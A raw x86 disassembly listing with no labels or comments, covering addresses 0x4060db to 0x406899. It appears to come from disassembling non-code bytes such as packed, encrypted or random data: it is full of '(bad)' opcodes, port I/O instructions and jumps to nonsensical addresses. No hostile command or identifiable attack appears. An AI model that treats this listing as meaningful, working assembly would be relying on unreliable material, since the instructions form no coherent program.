  4060db:	mov    esp,0x232a11c2
  4060e0:	(bad)  
  4060e1:	arpl   WORD PTR [edi+0x24],si
  4060e4:	and    BYTE PTR [ecx+0x12a60096],0x2a
  4060eb:	jle    0x40610a
  4060ed:	ins    BYTE PTR es:[edi],dx
  4060ee:	popf   
  4060ef:	mov    al,0xe8
  4060f1:	nop
  4060f2:	or     BYTE PTR [esp+eiz*4-0x62a11e07],cl
  4060f9:	iret   
  4060fa:	xchg   edi,eax
  4060fb:	pop    ss
  4060fc:	lock test DWORD PTR ds:[eax+ecx*2],0xaa92dab8
  406105:	xchg   ecx,eax
  406106:	pop    ebx
  406107:	or     esp,DWORD PTR [ebx+0x37]
  40610a:	mov    ecx,0xa4d82c85
  40610f:	rcr    DWORD PTR [ecx+ecx*8+0x72],cl
  406113:	clc    
  406114:	arpl   WORD PTR [edx-0xc518ad4],bx
  40611a:	xlat   BYTE PTR ds:[ebx]
  40611b:	(bad)  
  40611c:	xor    al,BYTE PTR [edi+eax*4]
  40611f:	or     eax,DWORD PTR [edx-0x75915ca6]
  406125:	sub    edx,DWORD PTR [eax+0x6c]
  406128:	ins    BYTE PTR es:[edi],dx
  406129:	pop    es
  40612a:	xor    esp,ebx
  40612c:	loope  0x406153
  40612e:	test   DWORD PTR [esi+0x1db3b9c5],ecx
  406134:	jae    0x4060bb
  406136:	fcmovb st,st(5)
  406138:	js     0x406106
  40613a:	in     eax,0xd7
  40613c:	push   esp
  40613d:	xlat   BYTE PTR cs:[ebx]
  40613f:	repnz or DWORD PTR [eax+0x22262c33],ebp
  406146:	leave  
  406147:	retf   0xba2a
  40614a:	jno    0x4061c9
  40614c:	mov    edx,0x6d9ad15e
  406151:	pop    ebx
  406152:	inc    ebp
  406153:	cmp    esp,eax
  406155:	pop    es
  406156:	mov    edx,0x739578cd
  40615b:	push   ecx
  40615c:	stos   BYTE PTR es:[edi],al
  40615d:	mov    ah,0x57
  40615f:	jne    0x406188
  406161:	cmp    dh,BYTE PTR [ebx+0x48]
  406164:	sub    dl,BYTE PTR [esi]
  406166:	repnz mov bh,0xde
  406169:	mov    edx,0xee46d885
  40616e:	jne    0x406117
  406170:	add    eax,0x3c15f371
  406175:	aas    
  406176:	psubw  mm5,QWORD PTR [ebx+0x57389b3f]
  40617d:	sub    eax,0x93d581af
  406182:	inc    ecx
  406183:	or     eax,0x605e0df
  406188:	xchg   esp,eax
  406189:	fcomp  QWORD PTR [eax+0x5a]
  40618c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40618d:	sbb    eax,DWORD PTR [edx-0x2a]
  406190:	leave  
  406191:	push   eax
  406192:	push   ecx
  406193:	dec    edi
  406194:	push   0x4fd04905
  406199:	push   esi
  40619a:	adc    BYTE PTR [edi+0x35],bl
  40619d:	jle    0x40615f
  40619f:	sbb    al,0x9a
  4061a1:	mov    edi,0xf5608ae5
  4061a6:	ret    0xf8aa
  4061a9:	fmul   DWORD PTR [ebx]
  4061ab:	shr    BYTE PTR [eax],0xd3
  4061ae:	dec    edi
  4061af:	pop    ebx
  4061b0:	call   0x8597e017
  4061b5:	gs mov bh,bh
  4061b8:	sub    BYTE PTR [edi+0x68],dh
  4061bb:	call   0x88ac:0xd8b79be8
  4061c2:	stos   BYTE PTR es:[edi],al
  4061c3:	in     al,dx
  4061c4:	push   ecx
  4061c5:	inc    edi
  4061c6:	popa   
  4061c7:	repz jle 0x4061fd
  4061ca:	adc    al,0xe1
  4061cc:	adc    edi,eax
  4061ce:	imul   eax,DWORD PTR [edx+0x4d04d667],0xffffffc5
  4061d5:	dec    ecx
  4061d6:	inc    ecx
  4061d7:	lea    eax,ds:0xebc2d4dd
  4061dd:	scas   eax,DWORD PTR es:[edi]
  4061de:	cmp    eax,0x88362323
  4061e3:	lods   al,BYTE PTR ds:[esi]
  4061e4:	add    eax,0x1da70d49
  4061e9:	mov    bl,0xba
  4061eb:	mov    BYTE PTR ds:0x21a8cd66,bl
  4061f1:	inc    ebx
  4061f2:	pop    edi
  4061f3:	imul   esp,DWORD PTR [ecx],0x40
  4061f6:	ret    0xdb4a
  4061f9:	mov    bh,0x29
  4061fb:	in     eax,0x1
  4061fd:	shr    DWORD PTR [eax],1
  4061ff:	in     eax,0xaf
  406201:	ret    0x8a7e
  406204:	dec    esi
  406205:	sbb    ebx,DWORD PTR [esi-0x4d]
  406208:	iret   
  406209:	jg     0x406258
  40620b:	into   
  40620c:	ror    BYTE PTR [edx],1
  40620e:	not    cl
  406210:	into   
  406211:	dec    esi
  406212:	push   ebx
  406213:	mov    ecx,0xa3440b42
  406218:	dec    eax
  406219:	pop    esp
  40621a:	add    eax,0xbe1a826b
  40621f:	cmp    BYTE PTR [edi+0x6f],dl
  406222:	mov    WORD PTR [ecx],ss
  406224:	mov    esp,0xf6e899ea
  406229:	mov    esi,0x16cf270b
  40622e:	enter  0xe90b,0xb7
  406232:	lahf   
  406233:	hlt    
  406234:	cld    
  406235:	imul   ecx,DWORD PTR [ebx-0x342f64b4],0x557111b1
  40623f:	xchg   DWORD PTR [ebp-0x39],ebp
  406242:	xlat   BYTE PTR ds:[ebx]
  406243:	gs adc cl,al
  406246:	inc    edx
  406247:	adc    al,0x36
  406249:	adc    ebx,esi
  40624b:	dec    eax
  40624c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624d:	popf   
  40624e:	mov    ah,0xbe
  406250:	mov    eax,ds:0x6cdd01dc
  406255:	and    eax,DWORD PTR ds:0x319c7939
  40625b:	adc    eax,0x65c54682
  406260:	xchg   DWORD PTR [ecx-0x11fcb3fb],edi
  406266:	pop    ebx
  406267:	sub    dh,BYTE PTR [esi+ecx*1]
  40626a:	and    al,0xe9
  40626c:	bound  ebp,QWORD PTR [ecx]
  40626e:	cld    
  40626f:	sbb    ecx,DWORD PTR [ebx-0x75]
  406272:	mov    cl,BYTE PTR [ecx]
  406274:	mov    bl,0x1f
  406276:	sub    bl,BYTE PTR [ebx-0x29]
  406279:	lods   al,BYTE PTR ds:[esi]
  40627a:	pop    ss
  40627b:	retf   
  40627c:	jmp    0x406218
  40627e:	stos   DWORD PTR es:[edi],eax
  40627f:	dec    ebp
  406280:	nop
  406281:	iret   
  406282:	dec    ecx
  406283:	out    0x7a,eax
  406285:	jle    0x4062ac
  406287:	add    esi,eax
  406289:	jp     0x4062f5
  40628b:	idiv   DWORD PTR [esi-0x77]
  40628e:	add    edi,ebx
  406290:	xor    dh,ah
  406292:	pop    edi
  406293:	jo     0x4062e0
  406295:	pop    esi
  406296:	xchg   ebp,eax
  406297:	imul   eax,DWORD PTR [edi-0x16],0xae72b0c
  40629e:	mov    dh,0x59
  4062a0:	idiv   cl
  4062a2:	mov    eax,ds:0xafa9f2ea
  4062a7:	and    al,0xf9
  4062a9:	or     cl,ch
  4062ab:	xchg   dh,dl
  4062ad:	sbb    ebp,ecx
  4062af:	adc    DWORD PTR [ebx+0x7306559b],eax
  4062b5:	xchg   esi,eax
  4062b6:	sub    ebx,DWORD PTR [ecx+ebx*4+0x5e]
  4062ba:	js     0x4062ce
  4062bc:	sbb    DWORD PTR [edi],0xbbb4fdf
  4062c2:	mov    BYTE PTR [ecx],cl
  4062c4:	pusha  
  4062c5:	in     al,dx
  4062c6:	retf   
  4062c7:	lock outs dx,DWORD PTR ds:[esi]
  4062c9:	dec    eax
  4062ca:	icebp  
  4062cb:	ret    
  4062cc:	(bad)  
  4062ce:	sbb    edi,DWORD PTR [edx-0x32e0f729]
  4062d4:	sbb    ebp,DWORD PTR [ecx-0x16]
  4062d7:	jae    0x406305
  4062d9:	in     eax,0xc5
  4062db:	test   BYTE PTR [eax-0x6],dh
  4062de:	nop
  4062df:	rol    BYTE PTR [edx-0x24b19c8d],1
  4062e5:	sub    al,bl
  4062e7:	mov    al,0xc1
  4062e9:	and    ch,BYTE PTR [esi-0x48]
  4062ec:	mov    esi,0x1a02c5e
  4062f1:	(bad)  
  4062f3:	xchg   esp,eax
  4062f4:	in     eax,dx
  4062f5:	push   ds
  4062f6:	out    0xb3,al
  4062f8:	sub    al,0xfc
  4062fa:	push   cs
  4062fb:	popa   
  4062fc:	and    BYTE PTR [esi],ch
  4062fe:	xlat   BYTE PTR ds:[ebx]
  4062ff:	lods   eax,DWORD PTR ds:[esi]
  406300:	xchg   DWORD PTR [ecx+0x21063285],esp
  406306:	mov    esp,0x6af42422
  40630b:	mov    al,0x1a
  40630d:	adc    eax,0xc8992807
  406312:	lods   eax,DWORD PTR ds:[esi]
  406313:	push   esp
  406314:	mov    bl,0xee
  406316:	inc    ebx
  406317:	(bad)  
  406319:	and    DWORD PTR [ebx],ecx
  40631b:	out    dx,al
  40631c:	das    
  40631d:	in     al,0xb2
  40631f:	leave  
  406320:	imul   esp,ecx,0x44
  406323:	sahf   
  406324:	xchg   esp,eax
  406325:	push   edi
  406326:	sbb    dl,ch
  406328:	fidiv  DWORD PTR [ecx+ebp*1]
  40632b:	jnp    0x4062be
  40632d:	push   cs
  40632e:	or     eax,DWORD PTR [ecx]
  406330:	scas   eax,DWORD PTR es:[edi]
  406331:	xor    al,0x43
  406333:	adc    eax,0x807f7ecf
  406338:	lods   al,BYTE PTR ds:[esi]
  406339:	push   DWORD PTR [edi+ebp*1]
  40633c:	int    0x2d
  40633e:	push   eax
  40633f:	call   0xaed52544
  406344:	adc    ecx,DWORD PTR [ecx+eiz*4]
  406347:	test   bh,cl
  406349:	ds jp  0x4063c5
  40634c:	fimul  DWORD PTR [eax]
  40634e:	jne    0x40630c
  406350:	sbb    al,dl
  406352:	lods   eax,DWORD PTR ds:[esi]
  406353:	pop    ds
  406354:	xor    ecx,DWORD PTR ds:0xc64a9cf7
  40635a:	push   es
  40635b:	aad    0xd5
  40635d:	xor    dl,BYTE PTR [ebp+0x2a]
  406360:	(bad)  
  406361:	fisubr DWORD PTR [ebp-0x52101b0b]
  406367:	outs   dx,DWORD PTR ds:[esi]
  406368:	mov    ebp,0xf6b7c74a
  40636d:	or     bl,ah
  40636f:	imul   esi,DWORD PTR [ecx+0x2b],0xae726290
  406376:	test   al,0x25
  406378:	jae    0x4063da
  40637a:	adc    eax,0xb1c63ede
  40637f:	jecxz  0x4063a3
  406381:	mov    ah,0x82
  406383:	xor    BYTE PTR [ecx+ebx*2-0x3b9cdcd5],dh
  40638a:	inc    ebp
  40638b:	pop    es
  40638c:	xchg   ebp,eax
  40638d:	shl    DWORD PTR [eax-0x58b5105b],cl
  406393:	test   ebp,ebp
  406395:	sbb    al,0xae
  406397:	(bad)  
  406399:	cmp    esi,DWORD PTR [edi+0x1379d8df]
  40639f:	in     eax,dx
  4063a0:	dec    edi
  4063a1:	rol    ebx,cl
  4063a3:	(bad)  
  4063a4:	mul    BYTE PTR [edx]
  4063a6:	data16 mov ds,WORD PTR [ecx-0x49eefb52]
  4063ad:	xor    edi,DWORD PTR [ebp+0x50]
  4063b0:	sbb    esp,DWORD PTR [edi]
  4063b2:	in     al,dx
  4063b3:	lods   eax,DWORD PTR ss:[esi]
  4063b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063b6:	jnp    0x4063d9
  4063b8:	out    dx,al
  4063b9:	mov    esp,0x8a5aaf1e
  4063be:	cmp    BYTE PTR [edi],0x3b
  4063c1:	std    
  4063c2:	ret    
  4063c3:	xor    esp,edx
  4063c5:	icebp  
  4063c6:	enter  0xbb1,0x67
  4063ca:	xchg   edi,eax
  4063cb:	retw   0xaeba
  4063cf:	ret    0x48ff
  4063d2:	cmp    DWORD PTR cs:[edx-0x22],esp
  4063d6:	loope  0x4063fa
  4063d8:	sub    ah,BYTE PTR [esi-0x6b62963c]
  4063de:	mov    ebx,0x90db35ae
  4063e3:	les    ebp,FWORD PTR [edx+0x1f]
  4063e6:	dec    ecx
  4063e7:	push   ss
  4063e8:	cmp    esp,DWORD PTR [eax+ebx*4-0x15]
  4063ec:	sub    DWORD PTR [edx],ecx
  4063ee:	(bad)  
  4063ef:	jno    0x40637e
  4063f1:	jp     0x40641c
  4063f3:	xchg   BYTE PTR [ebp-0xb211b0e],bh
  4063f9:	dec    edx
  4063fa:	or     al,BYTE PTR [ebp+0x57f000df]
  406400:	push   esi
  406401:	mov    esp,0x2f0b50fa
  406406:	sar    ebp,cl
  406408:	sahf   
  406409:	fs add eax,0xdd44aa4a
  40640f:	enter  0x9dbe,0x3b
  406413:	and    eax,0x46ff3f64
  406418:	out    0x75,al
  40641a:	into   
  40641b:	push   esi
  40641c:	push   es
  40641d:	jmp    0xaaaf03cf
  406422:	cld    
  406423:	xchg   DWORD PTR [eax-0x5933919],ecx
  406429:	stos   DWORD PTR es:[edi],eax
  40642a:	mov    al,ds:0x2d870b12
  40642f:	cs aas 
  406431:	mov    ecx,0xf506551d
  406436:	sar    bh,1
  406438:	inc    ebx
  406439:	loop   0x4063f8
  40643b:	and    ebx,DWORD PTR [ecx+edi*4-0x64]
  40643f:	inc    eax
  406440:	adc    ah,BYTE PTR [edx]
  406442:	cmp    DWORD PTR gs:[edx-0x5f584899],edi
  406449:	sub    BYTE PTR [ecx-0x63a707ce],ch
  40644f:	adc    BYTE PTR [esi-0x20],bl
  406452:	mov    edx,DWORD PTR [ebp-0x72]
  406455:	call   0x55ef2e8c
  40645a:	scas   al,BYTE PTR es:[edi]
  40645b:	lods   eax,DWORD PTR ds:[esi]
  40645c:	ins    BYTE PTR es:[edi],dx
  40645d:	dec    edx
  40645e:	(bad)  
  40645f:	stos   BYTE PTR es:[edi],al
  406460:	ja     0x406482
  406462:	fild   DWORD PTR [edx]
  406464:	cld    
  406465:	xchg   ebp,eax
  406466:	fist   DWORD PTR [esi]
  406468:	call   0x689b4998
  40646d:	mov    dh,BYTE PTR [esi+0x38]
  406470:	and    eax,0xc029b69b
  406475:	ror    BYTE PTR ds:0xefa54090,0x1a
  40647c:	xchg   ebp,eax
  40647d:	xlat   BYTE PTR ds:[ebx]
  40647e:	lods   al,BYTE PTR ds:[esi]
  40647f:	jmp    0x3544:0xbb8b4ede
  406486:	in     eax,dx
  406487:	in     eax,dx
  406488:	aad    0xf2
  40648a:	add    eax,0xa6ab7936
  40648f:	jns    0x40649c
  406491:	lds    esi,FWORD PTR [edx]
  406493:	mov    ebx,0xf3dfa3b9
  406498:	into   
  406499:	shl    eax,0x8e
  40649c:	and    al,bl
  40649e:	jmp    0xcb9fe7ac
  4064a3:	out    dx,eax
  4064a4:	inc    ebp
  4064a5:	dec    edx
  4064a6:	test   eax,0x4dc3f56f
  4064ab:	dec    ebx
  4064ac:	pop    esi
  4064ad:	inc    ecx
  4064ae:	icebp  
  4064af:	sbb    ecx,0x61
  4064b2:	pop    ds
  4064b3:	mov    ds:0x6d7b8c1f,eax
  4064b8:	mov    dl,0x9
  4064ba:	stos   DWORD PTR es:[edi],eax
  4064bb:	xor    BYTE PTR [ebp+eax*4+0x13],0x5c
  4064c0:	mov    dh,0x7d
  4064c2:	ds inc edx
  4064c4:	pushf  
  4064c5:	dec    edx
  4064c6:	pushf  
  4064c7:	retf   0x871b
  4064ca:	idiv   BYTE PTR [ebx-0x7be75668]
  4064d0:	pop    edi
  4064d1:	xchg   ebx,eax
  4064d2:	cwde   
  4064d3:	fld    TBYTE PTR [esi]
  4064d5:	sub    al,0x5d
  4064d7:	push   es
  4064d8:	stos   BYTE PTR es:[edi],al
  4064d9:	push   esp
  4064da:	or     BYTE PTR [esi],ah
  4064dc:	mov    dh,0x51
  4064de:	sub    DWORD PTR [esp+esi*8-0x4aeee40c],0x8f3b8e8
  4064e9:	xlat   BYTE PTR ds:[ebx]
  4064ea:	add    eax,0x5fa24277
  4064ef:	mov    WORD PTR [edx+0x18],cs
  4064f2:	cmc    
  4064f3:	mov    gs,WORD PTR [ecx]
  4064f5:	dec    esp
  4064f6:	mov    edx,0xa9ea5c53
  4064fb:	push   edx
  4064fc:	and    ebp,DWORD PTR [ecx+0x7c]
  4064ff:	sub    dl,BYTE PTR [eax-0x23]
  406502:	jmp    0x406559
  406504:	in     al,dx
  406505:	jae    0x406554
  406507:	adc    al,0xee
  406509:	cdq    
  40650a:	jmp    0xbd013fdd
  40650f:	sub    eax,0x5c97776f
  406514:	pop    ecx
  406515:	xor    eax,0xf9fad16f
  40651a:	xchg   BYTE PTR [eax+esi*4],dh
  40651d:	hlt    
  40651e:	jnp    0x4064ad
  406520:	jb     0x40658e
  406522:	int3   
  406523:	mov    ebx,0x4ee77503
  406528:	xchg   ebx,eax
  406529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40652a:	push   ebp
  40652b:	out    dx,al
  40652c:	inc    edx
  40652d:	mov    ebp,0xbc1383d0
  406532:	xor    DWORD PTR [edx+ebx*1],edx
  406535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406536:	dec    ebp
  406537:	in     al,dx
  406538:	lds    ecx,FWORD PTR [ebx+0x1]
  40653b:	icebp  
  40653c:	xchg   esp,eax
  40653d:	popf   
  40653e:	sub    DWORD PTR [ebx+ebx*1],eax
  406541:	hlt    
  406542:	jmp    0x4065b0
  406544:	sub    DWORD PTR [ecx],ebx
  406546:	and    bh,BYTE PTR [edx]
  406548:	jge    0x406511
  40654a:	leave  
  40654b:	sbb    DWORD PTR [ecx+eax*4-0xd4510ca],edx
  406552:	in     al,0xdc
  406554:	mov    edi,0xe1fb9c4
  406559:	out    0x9d,al
  40655b:	sub    eax,0x8dadc51a
  406560:	pop    ds
  406561:	push   ebx
  406562:	push   esp
  406563:	sub    DWORD PTR [eax-0x6a],edx
  406566:	cmc    
  406567:	mov    al,0x90
  406569:	adc    esp,DWORD PTR [edi+edx*4-0x2d96e359]
  406570:	xchg   ebp,eax
  406571:	leave  
  406572:	fdiv   st,st(3)
  406574:	mov    dh,0xc9
  406576:	cmp    al,0xf6
  406578:	pop    es
  406579:	ret    
  40657a:	sub    eax,0x56014075
  40657f:	push   cs
  406580:	push   es
  406581:	xchg   ebp,eax
  406582:	mov    ebx,0x4937eb59
  406587:	inc    edx
  406588:	js     0x4065f3
  40658a:	neg    DWORD PTR [ebx]
  40658c:	loope  0x406596
  40658e:	mov    cl,0xd0
  406590:	sub    al,0x1
  406592:	(bad)  
  406594:	push   esi
  406595:	push   ebp
  406596:	out    dx,eax
  406597:	lods   eax,DWORD PTR ds:[esi]
  406598:	rcr    BYTE PTR [ebx+0x70],1
  40659b:	imul   esp,edi,0xffffffb3
  40659e:	(bad)  
  40659f:	or     DWORD PTR [ebx+ebx*4-0xb],ebx
  4065a3:	mov    ecx,0xdc5c1d08
  4065a9:	cmp    al,0xe
  4065ab:	les    ebx,FWORD PTR [ecx]
  4065ad:	aam    0x67
  4065af:	fisub  WORD PTR [ecx-0x6588a98b]
  4065b5:	(bad)  
  4065b6:	fucomip st,st(5)
  4065b8:	cmp    dh,ch
  4065ba:	mov    eax,0xe0cf4b83
  4065bf:	lds    esi,FWORD PTR [edx-0x7e]
  4065c2:	fld    DWORD PTR [edi]
  4065c4:	mov    al,ds:0xfc707f2
  4065c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065ca:	mov    bh,0x99
  4065cc:	loopne 0x406568
  4065ce:	cli    
  4065cf:	inc    edi
  4065d0:	or     DWORD PTR [ecx],ecx
  4065d2:	adc    eax,0x4b02924d
  4065d7:	pop    ds
  4065d8:	xchg   ecx,eax
  4065d9:	loope  0x40659c
  4065db:	imul   edi,DWORD PTR [ecx],0x7dc1d64f
  4065e1:	aaa    
  4065e2:	neg    DWORD PTR [ecx]
  4065e4:	sub    al,0x2a
  4065e6:	cli    
  4065e7:	sbb    edx,DWORD PTR [edi-0x19c43901]
  4065ed:	push   ecx
  4065ee:	xchg   DWORD PTR ds:0xae96c521,ebx
  4065f4:	and    DWORD PTR [ebx-0xecb184c],0x37e29e51
  4065fe:	mov    ds:0x8c4c4822,al
  406603:	adc    eax,0x9cdf0bab
  406608:	add    al,0x88
  40660a:	nop
  40660b:	test   DWORD PTR [eax+0x443cb2ef],ebp
  406611:	pop    ebp
  406612:	aaa    
  406613:	data16 cmp dl,BYTE PTR [edi-0x2e7ef8a4]
  40661a:	sub    eax,0x574ef58d
  40661f:	rcr    DWORD PTR [ecx+0x2be358ca],1
  406625:	enter  0xb7b1,0x1
  406629:	mov    esi,0xd2b7dc0c
  40662e:	sub    al,0x85
  406630:	cli    
  406631:	pop    eax
  406632:	cmp    DWORD PTR [esp+eax*2],0xa06ad48c
  406639:	pop    eax
  40663a:	iret   
  40663b:	js     0x4066b1
  40663d:	fwait
  40663e:	ins    DWORD PTR es:[edi],dx
  40663f:	repz mov ch,0x32
  406642:	pop    esp
  406643:	mov    ebx,ecx
  406645:	pop    edx
  406646:	out    dx,eax
  406647:	sbb    al,0xc5
  406649:	enter  0x2fb2,0xd8
  40664d:	mov    al,ds:0x2a2c3d7e
  406652:	mov    al,ds:0xc4d99e01
  406657:	shl    BYTE PTR [edx-0x141d4f20],1
  40665d:	call   0xe786:0xea90e600
  406664:	jbe    0x406607
  406666:	je     0x4066d1
  406668:	sub    dh,dh
  40666a:	fadd   st(0),st
  40666c:	xchg   ebx,eax
  40666d:	xchg   edx,eax
  40666e:	dec    ecx
  40666f:	jns    0x4065f2
  406671:	push   ebx
  406672:	cmc    
  406673:	cs push es
  406675:	fst    QWORD PTR [eax+ebx*8]
  406678:	imul   esp,ebx,0x19f409b7
  40667e:	adc    al,bh
  406680:	outs   dx,BYTE PTR ds:[esi]
  406681:	add    DWORD PTR [edi],ecx
  406683:	adc    esp,DWORD PTR [ebp+0x586866d2]
  406689:	repnz test DWORD PTR [edx-0x29],0x19bbd325
  406691:	ins    DWORD PTR es:[edi],dx
  406692:	pop    edi
  406693:	cwde   
  406694:	repnz xor al,0xb6
  406697:	jns    0x406692
  406699:	sub    BYTE PTR [ebx+ecx*1-0x4a],0x26
  40669e:	loop   0x4066db
  4066a0:	and    DWORD PTR [edx-0x2e0a2e16],esp
  4066a6:	adc    eax,0xe3c6cea7
  4066ab:	pop    ecx
  4066ac:	push   esi
  4066ad:	pop    ecx
  4066ae:	xchg   ecx,eax
  4066af:	or     al,0x59
  4066b1:	jmp    0x406684
  4066b3:	rcl    BYTE PTR [ecx],1
  4066b5:	lea    edi,[esi-0x5341bdf4]
  4066bb:	cld    
  4066bc:	outs   dx,BYTE PTR ds:[esi]
  4066bd:	into   
  4066be:	push   0xddce0e6c
  4066c3:	mov    ?,ebx
  4066c5:	daa    
  4066c6:	pop    ecx
  4066c7:	jle    0x40670f
  4066c9:	mov    bl,0xc8
  4066cb:	pop    eax
  4066cc:	or     eax,0x32c3e493
  4066d1:	int    0x1b
  4066d3:	xchg   edx,eax
  4066d4:	int    0x12
  4066d6:	hlt    
  4066d7:	sahf   
  4066d8:	xchg   ebp,eax
  4066d9:	maskmovq mm4,(bad)
  4066da:	mul    DWORD PTR [edi+0x105144fa]
  4066e0:	clc    
  4066e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e2:	sbb    ebp,DWORD PTR [esp+eax*8]
  4066e5:	enter  0x532e,0xd4
  4066e9:	ror    BYTE PTR [ecx-0x68346590],cl
  4066ef:	out    dx,eax
  4066f0:	inc    esi
  4066f1:	out    dx,eax
  4066f2:	iret   
  4066f3:	rcl    BYTE PTR [ebp+0x4209009f],0x1e
  4066fa:	cmp    al,0x64
  4066fc:	push   eax
  4066fd:	or     al,0xb6
  4066ff:	sahf   
  406700:	xor    bl,BYTE PTR [eax+0x4f3597c5]
  406706:	call   0x915b:0xff317d78
  40670d:	xchg   ecx,eax
  40670e:	xchg   esp,eax
  40670f:	add    ebp,edi
  406711:	xchg   BYTE PTR [ecx-0x57],ch
  406714:	mov    ds:0x861b52e0,al
  406719:	stc    
  40671a:	ret    0x437f
  40671d:	rol    DWORD PTR [edx-0x63],cl
  406720:	dec    edi
  406721:	or     BYTE PTR [edi+0x33],bh
  406724:	enter  0x3f8,0xed
  406728:	cmp    eax,0x4e95725e
  40672d:	adc    DWORD PTR [ecx],ebx
  40672f:	xchg   DWORD PTR [edx],esi
  406731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406732:	mov    WORD PTR [edi],ds
  406734:	test   BYTE PTR [esi+0x43d986d0],bl
  40673a:	(bad)  
  40673b:	je     0x4066fd
  40673d:	inc    esp
  40673e:	or     DWORD PTR [ecx+0x44a0b1de],ecx
  406744:	into   
  406745:	(bad)  
  406746:	ins    BYTE PTR es:[edi],dx
  406747:	or     al,0xfa
  406749:	repnz loop 0x406733
  40674c:	fwait
  40674d:	xor    bh,0xdf
  406750:	jg     0x4066d8
  406752:	test   eax,0x9c53c347
  406757:	cli    
  406758:	jnp    0x4067c1
  40675a:	repz jne 0x4066ee
  40675d:	frstor [eax]
  40675f:	cmovs  esi,DWORD PTR [ebp+edi*2+0x37a9ad34]
  406767:	adc    edx,DWORD PTR [eax+edx*2-0x6]
  40676b:	adc    DWORD PTR [edx+0x6e],edi
  40676e:	into   
  40676f:	adc    dh,BYTE PTR es:[si-0x2810]
  406775:	xchg   ebx,eax
  406776:	call   0x3f065d22
  40677b:	inc    edx
  40677c:	mov    WORD PTR [edi+0x12],gs
  40677f:	aam    0x5e
  406781:	add    DWORD PTR [esi+eiz*1],edx
  406784:	dec    esi
  406785:	xlat   BYTE PTR ds:[ebx]
  406786:	cmp    eax,0x29345d8d
  40678b:	pop    esp
  40678c:	and    BYTE PTR [edi+0x32328cc],ah
  406792:	sub    ecx,ebp
  406794:	icebp  
  406795:	pushf  
  406796:	mov    al,0x8
  406798:	xor    eax,0xfaeedd7
  40679d:	pop    ss
  40679e:	dec    ebp
  40679f:	push   edi
  4067a0:	jge    0x406818
  4067a2:	xchg   ebx,eax
  4067a3:	xor    BYTE PTR [ebx+0x6b],cl
  4067a6:	or     al,0xb
  4067a8:	stos   BYTE PTR es:[edi],al
  4067a9:	fwait
  4067aa:	popf   
  4067ab:	mov    ch,ah
  4067ad:	pop    ebp
  4067ae:	icebp  
  4067af:	xlat   BYTE PTR ds:[ebx]
  4067b0:	inc    esi
  4067b1:	and    eax,0x3bec1330
  4067b6:	dec    edi
  4067b7:	jge    0x40673a
  4067b9:	push   esp
  4067ba:	push   ss
  4067bb:	xchg   esp,eax
  4067bc:	scas   eax,DWORD PTR es:[edi]
  4067bd:	push   cs
  4067be:	sbb    cl,BYTE PTR [edx+0xe7803fc]
  4067c4:	scas   al,BYTE PTR es:[edi]
  4067c5:	pop    eax
  4067c6:	nop
  4067c7:	imul   edi,DWORD PTR [esi-0x4],0xf4376b90
  4067ce:	stos   DWORD PTR es:[edi],eax
  4067cf:	mov    dh,0xee
  4067d1:	clc    
  4067d2:	in     eax,0x3b
  4067d4:	pop    edx
  4067d5:	and    ebp,esp
  4067d7:	hlt    
  4067d8:	fisttp QWORD PTR [edi-0x5a]
  4067db:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4067dd:	xor    edi,DWORD PTR [edx+eiz*8]
  4067e0:	scas   al,BYTE PTR es:[edi]
  4067e1:	sub    DWORD PTR [edi+0x22a6dfa6],ebp
  4067e7:	jge    0x40680a
  4067e9:	mov    edi,0x7ff1418c
  4067ee:	xor    dl,BYTE PTR [esp+eiz*2+0x79515cbf]
  4067f5:	or     edx,ecx
  4067f7:	xchg   esi,eax
  4067f8:	inc    esi
  4067f9:	test   al,0xc0
  4067fb:	lds    esp,FWORD PTR [eax-0x8]
  4067fe:	push   esi
  4067ff:	mov    ds:0xc66dbdc9,eax
  406804:	and    DWORD PTR [ecx],eax
  406806:	inc    eax
  406807:	jecxz  0x406813
  406809:	push   0xffffffae
  40680b:	add    ecx,DWORD PTR [ebp-0x2e]
  40680e:	loopne 0x406847
  406810:	adc    dl,cl
  406812:	es pop esp
  406814:	out    dx,al
  406815:	xor    edx,DWORD PTR [edi]
  406817:	repz push esi
  406819:	fs gs in al,0x93
  40681d:	pop    ebp
  40681e:	jo     0x40686f
  406820:	xor    al,BYTE PTR [ecx+edi*8+0x9]
  406824:	fnstcw WORD PTR [ebp-0x28929319]
  40682a:	ret    
  40682b:	push   cs
  40682c:	mov    WORD PTR [ecx+0x512aab6c],ds
  406832:	in     eax,dx
  406833:	test   BYTE PTR [ebx+eiz*8],bh
  406836:	stc    
  406837:	add    DWORD PTR [ecx+ecx*2-0x55],esi
  40683b:	and    eax,0x99e0bc1a
  406840:	rcr    BYTE PTR [eax+0x7bec00db],cl
  406846:	ds call 0xf9cb72e1
  40684c:	scas   eax,DWORD PTR es:[edi]
  40684d:	push   0x4e
  40684f:	sub    BYTE PTR [esp+ebx*4-0x5f],ah
  406853:	sub    dh,BYTE PTR [edx-0x7]
  406856:	add    ebx,DWORD PTR [ebp-0x45]
  406859:	ins    DWORD PTR es:[edi],dx
  40685a:	test   BYTE PTR [eax-0x403dafdd],dl
  406860:	mov    ebx,0x2e5bb098
  406865:	mov    eax,0x22972190
  40686a:	sbb    eax,0xbb533e48
  40686f:	sbb    edi,DWORD PTR [ebx-0x20a02500]
  406875:	sbb    esi,0x6b
  406878:	daa    
  406879:	and    ebx,edi
  40687b:	cs pop ecx
  40687d:	js     0x4068f6
  40687f:	test   DWORD PTR [edi+0x55351480],ebp
  406885:	stos   BYTE PTR es:[edi],al
  406886:	fild   DWORD PTR [ebx]
  406888:	ins    BYTE PTR es:[edi],dx
  406889:	mov    bl,0x70
  40688b:	sar    DWORD PTR [edi+0x76],cl
  40688e:	dec    eax
  40688f:	mov    bh,0xa0
  406891:	mov    ss,WORD PTR [ecx]
  406893:	mul    BYTE PTR gs:[esi-0x1a]
  406897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406898:	retf   
  406899:	adc    al,BYTE PTR [esi-0x3f27cf45]
